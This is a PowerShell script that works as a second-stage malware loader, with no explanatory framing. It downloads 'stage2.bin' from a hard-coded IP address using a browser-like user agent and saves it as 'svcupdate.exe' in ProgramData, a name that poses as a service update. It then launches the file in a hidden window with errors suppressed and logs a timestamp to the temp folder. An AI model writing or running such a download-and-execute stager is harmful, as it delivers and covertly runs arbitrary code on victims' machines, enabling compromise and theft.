[CmdletBinding()]
param(
    [string]$TransferUrl = "https://198.51.100.23/stage2.bin",
    [string]$Stage2Path = 'C:\ProgramData\svcupdate.exe',
    [int]$ConnectionTimeout = 71,
    [string]$BrowserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$StageResult = Invoke-Stage2Download -SourceUrl $TransferUrl -DestinationPath $Stage2Path -TimeoutSec $ConnectionTimeout -UserAgent $BrowserAgent
if ($StageResult) {
    Start-Process -FilePath $Stage2Path -WindowStyle Hidden -ErrorAction SilentlyContinue
}

Write-Output "stage 42 initialized"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
